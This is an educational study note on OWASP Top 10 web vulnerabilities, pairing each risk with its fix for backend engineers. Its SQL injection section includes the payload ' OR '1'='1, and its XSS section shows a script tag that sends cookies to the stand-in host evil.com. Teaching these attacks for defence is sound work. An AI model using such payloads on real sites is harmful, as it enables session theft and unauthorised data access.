# Common Vulnerabilities (OWASP Top 10 Concepts)

## What is it?
A regularly-updated, industry-standard list (by OWASP, the Open Web Application Security Project) of the most critical, common web application security risks — essential baseline knowledge for any backend engineer.

## Why care?
These aren't theoretical — they're the actual, most common ways real production systems get breached. Knowing them is both a security responsibility and a frequently-tested interview topic.

## SQL Injection
Untrusted input concatenated directly into a SQL query, letting an attacker manipulate the query itself.
```python
# VULNERABLE
query = f"SELECT * FROM users WHERE username = '{username}'"
# attacker enters: username = "' OR '1'='1"  -> returns ALL users, bypassing the intended filter

# SAFE — parameterized queries (always use these)
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
```
**The fix is always the same**: use parameterized queries / prepared statements, NEVER string-concatenate user input into SQL. Virtually every modern ORM/database library supports this natively — there's rarely a good reason to build raw SQL strings from user input.

## Cross-Site Scripting (XSS)
Untrusted input rendered as HTML/JS in a browser, letting an attacker run malicious scripts in another user's browser session.
```html
<!-- If a comment field isn't escaped, an attacker submits: -->
<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>
```
**Fix**: escape/sanitize all user-generated content before rendering as HTML; modern frontend frameworks (React, Vue) escape by default, but raw `innerHTML`/`dangerouslySetInnerHTML` usage bypasses this protection and needs explicit care.

## Cross-Site Request Forgery (CSRF)
Tricking a logged-in user's browser into unknowingly submitting a request to your site (e.g., via a malicious link/image on another site), exploiting the fact that cookies are sent automatically.
**Fix**: CSRF tokens (a unique, unpredictable value the server verifies on state-changing requests), and `SameSite` cookie attributes restricting when cookies are sent cross-site.

## Broken Authentication/Authorization
Covered in depth in `Authentication-vs-Authorization.md` — includes missing ownership checks (IDOR — Insecure Direct Object Reference), weak session management, and missing rate limiting on login endpoints.

## Security Misconfiguration
Default credentials left unchanged, verbose error messages leaking stack traces/internal details to users, unnecessary services/ports exposed, outdated dependencies with known vulnerabilities.
```python
# BAD — leaks internal implementation details to any client
except Exception as e:
    return {"error": str(e), "traceback": traceback.format_exc()}, 500

# GOOD — generic message to the client, full detail only in server-side logs
except Exception as e:
    logger.error(f"Unhandled error: {e}", exc_info=True)
    return {"error": "Internal server error"}, 500
```

## Sensitive Data Exposure
Transmitting or storing sensitive data (passwords, tokens, PII) without encryption — always use HTTPS (`HTTPS-TLS.md`) in transit, and encrypt genuinely sensitive data at rest.

## Using Components with Known Vulnerabilities
Outdated dependencies with publicly known CVEs (Common Vulnerabilities and Exposures) are a very common real attack vector — regularly run dependency vulnerability scanners (`npm audit`, `pip-audit`, Dependabot/Snyk) as part of your normal development workflow.

## In backend engineering
- **Security is not a one-time checklist** — it's an ongoing practice: code review with security in mind, regular dependency updates, and treating ALL user input as untrusted by default are the real, day-to-day habits that prevent most of these issues.
- **Defense in depth**: don't rely on a single layer of protection — e.g., validate input AND use parameterized queries AND apply the principle of least privilege on database credentials, so that even if one layer fails, others still provide protection.
